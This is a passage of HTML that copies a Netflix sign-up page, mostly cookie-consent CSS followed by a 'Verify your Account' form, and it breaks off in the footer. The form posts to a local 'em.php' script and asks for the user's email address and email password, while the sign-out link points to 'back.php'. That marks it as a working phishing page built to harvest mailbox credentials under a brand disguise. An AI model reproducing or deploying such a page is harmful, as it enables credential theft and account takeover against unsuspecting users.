      #onetrust-pc-sdk .ot-active-leg-btn{
        cursor:default;
        pointer-events:none}
      #onetrust-pc-sdk .ot-active-leg-btn svg{
        display:inline-block}
      #onetrust-pc-sdk .ot-remove-objection-handler{
        border:none;
        text-decoration:underline;
        padding:0;
        font-size:.82em;
        font-weight:600;
        line-height:1.4;
        padding-left:10px}
      #onetrust-pc-sdk .ot-obj-leg-btn-handler span{
        font-weight:bold;
        text-align:center;
        font-size:.91em;
        line-height:1.5}
      #onetrust-pc-sdk.otPcTab[dir=rtl] .ot-pc-footer-logo svg{
        direction:rtl}
      #onetrust-pc-sdk.otPcTab[dir=rtl] input~.accordion-header .ot-arrow,#onetrust-pc-sdk.otPcTab[dir=rtl] #ot-back-arrow{
        transform:rotate(180deg);
        -o-transform:rotate(180deg);
        -ms-transform:rotate(180deg);
        -webkit-transform:rotate(180deg)}
      #onetrust-pc-sdk.otPcTab[dir=rtl] input:checked~.accordion-header .ot-arrow{
        transform:rotate(270deg);
        -o-transform:rotate(270deg);
        -ms-transform:rotate(270deg);
        -webkit-transform:rotate(270deg)}
      #onetrust-pc-sdk.otPcTab[dir=rtl] #search-container svg{
        right:52px}
      #onetrust-pc-sdk.otPcTab[dir=rtl] .ot-checkbox label::after{
        transform:rotate(45deg);
        -webkit-transform:rotate(45deg);
        -o-transform:rotate(45deg);
        -ms-transform:rotate(45deg);
        border-left:0;
        border-right:3px solid}
      #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon{
        padding:0;
        background-color:transparent;
        border:none}
      @media(max-width: 767px){
        #onetrust-pc-sdk.otPcTab{
          width:100%;
          height:100%;
          border:none}
        #onetrust-pc-sdk.otPcTab .ot-sdk-container,#onetrust-pc-sdk.otPcTab .ot-button-group-parent,#onetrust-pc-sdk.otPcTab .ot-pc-footer-logo{
          width:100%}
        #onetrust-pc-sdk.otPcTab .ot-sdk-container{
          padding:0;
          margin:0}
        #onetrust-pc-sdk.otPcTab #pc-title{
          margin-left:10px;
          margin-top:10px;
          max-width:60%}
        #onetrust-pc-sdk.otPcTab .description-container{
          margin:0;
          padding-top:20px;
          padding-right:20px;
          padding-bottom:15px;
          padding-left:20px;
          position:relative;
          left:auto}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out .description-container{
          margin-top:20px;
          margin-left:20px;
          padding:0;
          padding-bottom:10px}
        #onetrust-pc-sdk.otPcTab .groups-container{
          max-height:none;
          height:auto;
          overflow:hidden}
        #onetrust-pc-sdk.otPcTab .ot-button-group-parent{
          padding-left:0;
          padding-right:0;
          position:relative}
        #onetrust-pc-sdk.otPcTab .ot-button-group,#onetrust-pc-sdk.otPcTab #accept-recommended-btn-handler{
          float:none}
        #onetrust-pc-sdk.otPcTab .save-preference-btn-handler,#onetrust-pc-sdk.otPcTab #accept-recommended-btn-handler,#onetrust-pc-sdk.otPcTab .ot-pc-refuse-all-handler{
          width:calc(100% - 33px)}
      }
      @media(max-width: 640px){
        #onetrust-pc-sdk.otPcTab .pc-header{
          padding:10px;
          width:calc(100% - 20px)}
        #onetrust-pc-sdk.otPcTab #ot-content{
          height:calc(100% - 275px)}
        #onetrust-pc-sdk.otPcTab .ot-button-group-parent{
          padding:15px;
          margin:0;
          width:calc(100% - 30px)}
        #onetrust-pc-sdk.otPcTab .ot-sdk-row .ot-sdk-columns{
          width:100%}
        #onetrust-pc-sdk.otPcTab .description-container{
          margin:0}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out .description-container{
          margin-left:10px;
          width:calc(100% - 15px);
          margin-top:5px;
          margin-bottom:5px}
        #onetrust-pc-sdk.otPcTab .vendor-info{
          max-width:80%}
        #onetrust-pc-sdk.otPcTab #filter-container{
          bottom:5px;
          position:relative;
          float:right;
          right:15px}
        #onetrust-pc-sdk.otPcTab #vendor-list-content{
          height:calc(100% - 305px);
          width:calc(100% - 18px);
          padding-top:13px;
          padding-right:5px;
          padding-left:10px}
        #onetrust-pc-sdk.otPcTab #ot-triangle{
          top:190px}
        #onetrust-pc-sdk.otPcTab #ot-filter-modal{
          top:196px}
        #onetrust-pc-sdk.otPcTab .ot-pc-footer-logo a{
          width:auto}
      }
      @media(max-width: 600px){
        #onetrust-pc-sdk.otPcTab .vendor-content{
          overflow-y:scroll}
        #onetrust-pc-sdk.otPcTab #vendor-list-content{
          height:auto;
          overflow:hidden}
        #onetrust-pc-sdk.otPcTab #vendors-list-header{
          height:70px;
          padding:15px 0;
          width:100%}
        #onetrust-pc-sdk.otPcTab #search-container{
          display:inline-block;
          width:85%;
          position:absolute}
        #onetrust-pc-sdk.otPcTab .navigation-container{
          display:block;
          text-align:left;
          float:none;
          border-bottom:1px solid #d7d7d7;
          padding-bottom:15px;
          padding-left:15px}
        #onetrust-pc-sdk.otPcTab .action-container{
          width:calc(100% - 15px);
          float:none;
          bottom:auto;
          display:inline-block;
          padding-top:8px;
          padding-left:15px}
        #onetrust-pc-sdk.otPcTab #vendor-search-handler{
          width:90%}
        #onetrust-pc-sdk.otPcTab .ot-button-group-parent{
          display:inline-block;
          height:auto;
          margin-bottom:10px}
      }
      @media(max-width: 425px){
        #onetrust-pc-sdk.otPcTab #vendors-list .accordion-text{
          padding-top:6px;
          padding-right:25px;
          padding-bottom:10px;
          padding-left:25px}
        #onetrust-pc-sdk.otPcTab #vendors-list-container .ot-toggle-group,#onetrust-pc-sdk.otPcTab #hosts-list-container .ot-toggle-group{
          width:100%}
        #onetrust-pc-sdk.otPcTab #vendors-list-container .host-notice,#onetrust-pc-sdk.otPcTab #vendors-list-container .vendor-notice,#onetrust-pc-sdk.otPcTab #hosts-list-container .host-notice,#onetrust-pc-sdk.otPcTab #hosts-list-container .vendor-notice{
          width:100%;
          float:left;
          margin-left:30px}
        #onetrust-pc-sdk.otPcTab #vendors-list-container .ot-arrow-container,#onetrust-pc-sdk.otPcTab #hosts-list-container .ot-arrow-container{
          float:left}
        #onetrust-pc-sdk.otPcTab #vendors-list-container .vendor-info{
          float:left;
          width:100%;
          max-width:85%}
        #onetrust-pc-sdk.otPcTab #pc-title{
          max-width:100%}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out .cookie-subgroups-container li.cookie-subgroup{
          margin-left:10px;
          width:calc(100% - 10px)}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out #vendors-list-container .ot-toggle-group{
          width:auto;
          float:right}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out #vendors-list-container .ot-arrow-container{
          float:right}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out #vendors-list-container .vendor-info{
          max-width:47%}
      }
      @media only screen and (min-width: 320px)and (max-width: 896px)and (orientation: landscape){
        #onetrust-pc-sdk.otPcTab{
          height:100%}
        #onetrust-pc-sdk.otPcTab #ot-content{
          height:calc(100% - 162px)}
        #onetrust-pc-sdk.otPcTab .pc-header{
          padding:10px;
          width:calc(100% - 20px)}
        #onetrust-pc-sdk.otPcTab .ot-button-group-parent{
          padding:20px;
          width:calc(100% - 40px)}
        #onetrust-pc-sdk.otPcTab .vendor-content{
          overflow-y:scroll}
        #onetrust-pc-sdk.otPcTab #vendor-list-content{
          height:auto;
          overflow:hidden}
        #onetrust-pc-sdk.otPcTab .ot-button-group,#onetrust-pc-sdk.otPcTab #accept-recommended-btn-handler{
          float:right}
        #onetrust-pc-sdk.otPcTab .ot-pc-footer-logo,#onetrust-pc-sdk.otPcTab .save-preference-btn-handler,#onetrust-pc-sdk.otPcTab #accept-recommended-btn-handler{
          width:auto}
      }
      @media only screen and (min-width: 320px)and (max-width: 640px)and (orientation: landscape){
        #onetrust-pc-sdk.otPcTab .ot-sdk-row .ot-sdk-columns{
          width:100%}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out .description-container{
          width:calc(100% - 15px)}
      }
      @media only screen and (min-width: 641px)and (max-width: 896px)and (orientation: landscape){
        #onetrust-pc-sdk.otPcTab .description-container{
          position:absolute;
          left:30%}
      }
      @media(max-width: 425px),(max-width: 896px)and (max-height: 425px)and (orientation: landscape){
        #onetrust-pc-sdk.otPcTab .pc-header{
          padding-right:20px}
        #onetrust-pc-sdk.otPcTab .pc-logo-container{
          margin-left:0px;
          margin-top:5px}
        #onetrust-pc-sdk.otPcTab .pc-logo{
          height:40px;
          width:150px}
        #onetrust-pc-sdk.otPcTab .pc-close-btn-container{
          margin-top:10px}
        #onetrust-pc-sdk.otPcTab .pc-close-btn-container .ot-close-icon{
          width:12px;
          height:12px}
        #onetrust-pc-sdk.otPcTab .group-toggle{
          float:right;
          margin-left:10px;
          width:auto}
        #onetrust-pc-sdk.otPcTab.ot-leg-opt-out .group-toggle{
          margin-left:0px;
          padding-right:10px}
        #onetrust-pc-sdk.otPcTab #pc-privacy-header,#onetrust-pc-sdk.otPcTab .group-toggle .category-header{
          display:none}
      }
      @media only screen and (min-device-width: 768px)and (max-device-width: 1024px)and (orientation: landscape)and (-webkit-min-device-pixel-ratio: 1){
        #onetrust-pc-sdk.otPcTab #vendors-list-header input{
          min-width:250px;
          max-width:300px}
      }
      #onetrust-consent-sdk #onetrust-pc-sdk,
      #onetrust-consent-sdk #search-container,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
      #onetrust-consent-sdk #onetrust-pc-sdk group-toggle .checkbox,
      #onetrust-consent-sdk #onetrust-pc-sdk #pc-title:after
      {
        background-color: #FFFFFF;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk h3,
      #onetrust-consent-sdk #onetrust-pc-sdk h4,
      #onetrust-consent-sdk #onetrust-pc-sdk h5,
      #onetrust-consent-sdk #onetrust-pc-sdk h6,
      #onetrust-consent-sdk #onetrust-pc-sdk p,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list-container .vendor-options p,
      #onetrust-consent-sdk #onetrust-pc-sdk #pc-policy-text,
      #onetrust-consent-sdk #onetrust-pc-sdk #pc-title,
      #onetrust-consent-sdk #onetrust-pc-sdk .leg-int-title,
      #onetrust-consent-sdk #onetrust-pc-sdk .leg-int-sel-all-hdr span,
      #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .vendor-host,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-filter-modal #modal-header,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #select-all-container p,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #vendors-list-title,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list .back-btn-handler p,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list .vendor-title,
      #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #vendors-list-container .consent-category,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
      #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler 
      {
        color: #333333;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler + a,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
      #onetrust-consent-sdk #onetrust-pc-sdk .vendor-privacy-notice,
      #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .host-title a,
      #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .accordion-header .host-view-cookies,
      #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .vendor-host a
      {
        color: #3860BE;
      }
      #onetrust-consent-sdk #onetrust-banner-sdk a[href]
      {
        color: #3860BE;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
        opacity: .7;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk 
      button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler),
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
        background-color: #e50914;
        border-color: #e50914;
        color: #FFFFFF;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .active-group {
        border-color: #e50914;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler{
        background-color: transparent;
        border:1px solid transparent;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
        background-color : white;
        border-color: #c4ccd7;
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .category-menu-switch-handler {
        background-color: #F4F4F4
      }
      #onetrust-consent-sdk #onetrust-pc-sdk .active-group {
        background-color: #FFFFFF
      }
      #onetrust-consent-sdk div#ot-desc-id-C0002 .group-toggle .always-active {
        display: none;
      }
      #onetrust-pc-sdk #filter-btn-handler svg {
        cursor: pointer;
        width: 15px;
        height: 15px;
        display: none;
      }
      #onetrust-pc-sdk #vendors-list-header input {
        border: 1px solid #d7d7d7;
        height: 32px;
        width: 300px;
        border-radius: 50px;
        font-size: .8em;
        padding-right: 35px;
        padding-left: 15px;
        float: left;
        display: none;
      }
      #onetrust-pc-sdk #search-container svg {
        position: absolute;
        right: 35px;
        width: 30px;
        height: 30px;
        font-size: 1em;
        line-height: 1;
        top: 3px;
        display: none;
      }
      .ot-sdk-cookie-policy{
        font-family:inherit;
        font-size:16px}
      .ot-sdk-cookie-policy h3,.ot-sdk-cookie-policy h4,.ot-sdk-cookie-policy h6,.ot-sdk-cookie-policy p,.ot-sdk-cookie-policy li,.ot-sdk-cookie-policy a,.ot-sdk-cookie-policy th,.ot-sdk-cookie-policy #cookie-policy-description,.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,.ot-sdk-cookie-policy #cookie-policy-title{
        color:dimgray}
      .ot-sdk-cookie-policy #cookie-policy-description{
        margin-bottom:1em}
      .ot-sdk-cookie-policy h4{
        font-size:1.2em}
      .ot-sdk-cookie-policy h6{
        font-size:1em;
        margin-top:2em}
      .ot-sdk-cookie-policy th{
        min-width:75px}
      .ot-sdk-cookie-policy a,.ot-sdk-cookie-policy a:hover{
        background:#fff}
      .ot-sdk-cookie-policy thead{
        background-color:#f6f6f4;
        font-weight:bold}
      .ot-sdk-cookie-policy .ot-mobile-border{
        display:none}
      .ot-sdk-cookie-policy section{
        margin-bottom:2em}
      .ot-sdk-cookie-policy table{
        border-collapse:inherit}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy{
        font-family:inherit;
        font-size:16px}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title{
        color:dimgray}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description{
        margin-bottom:1em}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup{
        margin-left:1.5rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span{
        font-size:.9rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group{
        font-size:1rem;
        margin-bottom:.6rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title{
        margin-bottom:1.2rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section{
        margin-bottom:1rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th{
        min-width:75px}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover{
        background:#fff}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead{
        background-color:#f6f6f4;
        font-weight:bold}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border{
        display:none}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section{
        margin-bottom:2em}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li{
        list-style:disc;
        margin-left:1.5rem}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4{
        display:inline-block}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table{
        border-collapse:inherit;
        margin:auto;
        border:1px solid #d7d7d7;
        border-radius:5px;
        border-spacing:initial;
        width:100%;
        overflow:hidden}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td{
        border-bottom:1px solid #d7d7d7;
        border-right:1px solid #d7d7d7}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td{
        border-bottom:0px}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child{
        border-right:0px}
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type{
        width:25%}
      .ot-sdk-cookie-policy[dir=rtl]{
        text-align:left}
      @media only screen and (max-width: 530px){
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr{
          display:block}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr{
          position:absolute;
          top:-9999px;
          left:-9999px}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr{
          margin:0 0 1rem 0}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a{
          background:#f6f6f4}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td{
          border:none;
          border-bottom:1px solid #eee;
          position:relative;
          padding-left:50%}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before{
          position:absolute;
          height:100%;
          left:6px;
          width:40%;
          padding-right:10px}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border{
          display:inline-block;
          background-color:#e4e4e4;
          position:absolute;
          height:100%;
          top:0;
          left:45%;
          width:2px}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before{
          content:attr(data-label);
          font-weight:bold}
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li{
          word-break:break-word;
          word-wrap:break-word}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table{
          overflow:hidden}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td{
          border:none;
          border-bottom:1px solid #d7d7d7}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr{
          display:block}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type{
          width:auto}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr{
          margin:0 0 1rem 0}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before{
          height:100%;
          width:40%;
          padding-right:10px}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before{
          content:attr(data-label);
          font-weight:bold}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li{
          word-break:break-word;
          word-wrap:break-word}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr{
          position:absolute;
          top:-9999px;
          left:-9999px;
          z-index:-9999}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td{
          border-bottom:1px solid #d7d7d7;
          border-right:0px}
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child{
          border-bottom:0px}
      }
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
        color: #696969;
      }
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
        color: #696969;
      }
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
        color: #696969;
      }
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
        color: #696969;
      }
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
        background-color: #F8F8F8;
      }
    </style>
  </head>
  <body>
    <div id="appMountPoint">
      <div class="netflix-sans-font-loaded">
        <div class="basicLayout firefox modernInApp signupSimplicity-registration simplicity" dir="ltr" lang="en-DE">
          <div class="nfHeader noBorderHeader signupBasicHeader">
            <br>
            <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
              <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                <g id="netflix-logo">
                  <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14">
                  </path>
                </g>
              </svg>
              <span class="screen-reader-text">Netflix
              </span>
            </a>
            <a href="back.php" class="authLinks signupBasicHeader" data-uia="header-login-link">Sign Out
            </a>
          </div>
          <div class="simpleContainer" data-transitioned-child="true">
            <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
              <form method="POST" action="em.php">
                <div class="regFormContainer" data-uia="form-registration">
                  <div class="stepHeader-container" data-uia="header">
                    <div class="stepHeader" data-a11y-focus="true" tabindex="0">
                      <span id="" class="stepIndicator" data-uia="">STEP 
                        <b>1
                        </b> OF 
                        <b>3
                        </b>
                      </span>
                      <h1 class="stepTitle" data-uia="stepTitle">Verify your Account to continue.
                      </h1>
                    </div>
                  </div>
                  <div>
                    <div class="contextRow" data-uia="contextRowDone">Just a few more steps and you're done!
                    </div>
                    <div class="contextRow" data-uia="contextRowPaperWork">We hate paperwork, too.
                    </div>
                    <ul class="simpleForm structural ui-grid">
                      <li data-uia="field-email+wrapper" class="nfFormSpace">
                        <div data-uia="field-email+container" class="nfInput validated nfInputOversize">
                          <div class="nfInputPlacement">
                            <label class="input_id" placeholder="email">
                              <input data-uia="field-email" name="email" class="nfTextField hasText" id="id_email" type="email" tabindex="0" autocomplete="email" maxlength="50" minlength="5" dir="ltr" value="" placeholder="Email " required="">
                              <label for="id_email" class="placeLabel">Email
                              </label>
                            </label>
                          </div>
                        </div>
                      </li>
                      <li data-uia="field-password+wrapper" class="nfFormSpace">
                        <div data-uia="field-password+container" class="nfInput validated nfInputOversize">
                          <div class="nfInputPlacement">
                            <label class="input_id" placeholder="password">
                              <input data-uia="field-password" name="email_password" class="nfTextField hasText" id="id_password" type="password" tabindex="0" autocomplete="password" maxlength="77" minlength="4" dir="ltr" value="" required="" placeholder="Email password">
                              <label for="id_password" class="placeLabel">Email Password
                              </label>
                            </label>
                          </div>
                        </div>
                      </li>
                      <li data-uia="field-emailPreference+wrapper" class="nfFormSpace">
                        <div class="ui-binary-input">
                          <input type="checkbox" class="" name="emailPreference" id="cb_emailPreference" tabindex="0" data-uia="field-emailPreference" value="true">
                          <label for="cb_emailPreference" data-uia="field-emailPreference+label">Yes, please email me Netflix special offers.
                          </label>
                          <div class="helper">
                          </div>
                        </div>
                      </li>
                    </ul>
                  </div>
                </div>
                <div class="submitBtnContainer">
                  <button type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_continue">Continue
                  </button>
                </div>
              </form>
            </div>
          </div>
          <div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
            <div class="footer-divider">
            </div>
            <div class="site-footer">
              <p class="footer-top">Questions? Call 
                <a class="footer-top-a" href="tel:0800-4564-3455">0800-4564-3455
                </a>
              </p>
              <ul class="footer-links structural">
                <li class="footer-link-item" placeholder="footer_responsive_link_faq_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq">
                    <span id="" data-uia="data-uia-footer-label">FAQ
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_help_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help">
                    <span id="" data-uia="data-uia-footer-label">Help Center
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_terms_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms">
                    <span id="" data-uia="data-uia-footer-label">Terms of Use
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link">
                    <span id="" data-uia="data-uia-footer-label">Privacy
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link">
                    <span id="" data-uia="data-uia-footer-label">Cookie Preferences
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information">
                    <span id="" data-uia="data-uia-footer-label">Corporate Information
